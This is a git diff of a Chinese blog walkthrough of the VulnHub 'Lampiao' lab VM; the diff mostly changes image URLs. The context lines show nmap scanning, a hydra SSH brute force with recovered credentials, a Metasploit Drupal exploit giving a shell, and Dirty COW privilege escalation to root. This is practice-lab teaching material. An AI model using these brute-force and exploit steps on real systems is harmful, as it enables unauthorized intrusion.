@@ -7,8 +7,6 @@ date: 2023-02-23 13:07:58
 updated: 2023-02-23 13:07:58
 ---
 
-### 环境搭建
-
 访问官网：https://www.vulnhub.com/entry/lampiao-1,249/
 
 页面向下滑找到 Download 下载靶场；下载成功后，启动虚拟机，单击“打开”选项，找到刚刚下载并解压好的靶场文件，等待导入完成；
@@ -40,7 +38,7 @@ nmap -sS -Pn 192.168.19.0/24
 # 要扫描的网段，24指的是32位二进制的前24位用 “1” 表示，并变化后面的几位来进行扫描
 ```
 
- ![](https://pic.mewhz.com/lampiao/1.png)
+ ![](https://pic.mewhz.com/blog/1-lampiao.png)
 
 发现这个 ip 的 80 端口是开放的，去访问这个网站，发现是一个静态页面；
 
@@ -52,7 +50,7 @@ nmap -T4 -p 1-65535 192.168.19.136
 # -p 设置扫描的端口范围，1-65535 是所有的端口
 ```
 
- ![](https://pic.mewhz.com/lampiao/2.png)
+ ![](https://pic.mewhz.com/blog/2-lampiao.png)
 
 发现开启着 ssh 服务(22端口)，80 端口和 1898 端口，尝试访问 1898端口。
 
@@ -64,7 +62,7 @@ nmap -T4 -p 1-65535 192.168.19.136
 http://192.168.19.136:1898/?q=node/2
 ```
 
- ![](https://pic.mewhz.com/lampiao/3.png)
+ ![](https://pic.mewhz.com/blog/3-lampiao.png)
 
 发现一个 m4a 和 png 文件，扫描二维码发现没有有用的信息，听 m4a 文件可以得到用户名为
 
@@ -78,7 +76,7 @@ cewl http://192.168.19.136:1898/?q=node/1 -w password.txt
 # -w 结果写入文件
 ```
 
- ![](https://pic.mewhz.com/lampiao/4.png)
+ ![](https://pic.mewhz.com/blog/4-lampiao.png)
 
 使用 hydra 工具：
 
@@ -91,7 +89,7 @@ hydra -l tiago -P password.txt 192.168.19.136 ssh
 
 成功得到用户名密码：username: **tiago**   password: **Virgulino**
 
-![](https://pic.mewhz.com/lampiao/5.png)
+![](https://pic.mewhz.com/blog/5-lampiao.png)
 
 使用 ssh 命令成功登录：
 
@@ -99,7 +97,7 @@ hydra -l tiago -P password.txt 192.168.19.136 ssh
 ssh tiago@192.168.19.136
 ```
 
-![](https://pic.mewhz.com/lampiao/6.png)
+![](https://pic.mewhz.com/blog/6-lampiao.png)
 
 #### 漏洞利用 (第二种获取 shell 方法)
 
@@ -109,7 +107,7 @@ ssh tiago@192.168.19.136
 dirsearch -u 192.168.19.136:1898
 ```
 
-![](https://pic.mewhz.com/lampiao/7.png)
+![](https://pic.mewhz.com/blog/7-lampiao.png)
 
 发现 CHANGELOG.txt 文件，并通过该文件得到了 Drupal 的版本，百度搜索发现该版本存在漏洞，使用 msfconsole 利用漏洞；
 
@@ -122,7 +120,7 @@ search Drupal
 # 启动后输入该命令搜索 Drupal 相关漏洞
 ```
 
-![](https://pic.mewhz.com/lampiao/8.png)
+![](https://pic.mewhz.com/blog/8-lampiao.png)
 
 找到对应的漏洞
 
@@ -140,8 +138,7 @@ run
 ```
 
 成功拿到对应的 shell
-
-![](https://pic.mewhz.com/lampiao/9.png)
+![](https://pic.mewhz.com/blog/9-lampiao.png)
 
 执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用 python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：
 
@@ -154,7 +151,7 @@ python -c 'import pty;  pty.spawn("/bin/bash")'
 # pty.spawn 生成一个进程，并将其控制终端连接到当前进程的标准 io。
 ```
 
-![](https://pic.mewhz.com/lampiao/10.png)
+![](https://pic.mewhz.com/blog/10-lampiao.png)
 
 ### 提权
 
@@ -166,7 +163,7 @@ uname -r
 # -r 显示操作系统的发行编号
 ```
 
-![](https://pic.mewhz.com/lampiao/11.png)
+![](https://pic.mewhz.com/blog/11-lampiao.png)
 
 发现该版本存在脏牛漏洞，可以使用脏牛(Dirty Cow)漏洞进行提权；
 
@@ -177,7 +174,7 @@ searchsploit dirty
 
 ExploitDB是一个面向全世界黑客的漏洞提交平台；https://www.exploit-db.com
 
-![](https://pic.mewhz.com/lampiao/12.png)
+![](https://pic.mewhz.com/blog/12-lampiao.png)
 
 使用 40847.cpp 作为提权的代码文件，首先在本机找到该文件
 
@@ -220,7 +217,7 @@ su root
 
 在 root 目录下成功找到 flag.txt
 
-![](https://pic.mewhz.com/lampiao/13.png)
+![](https://pic.mewhz.com/blog/13-lampiao.png)
 
 ---
 
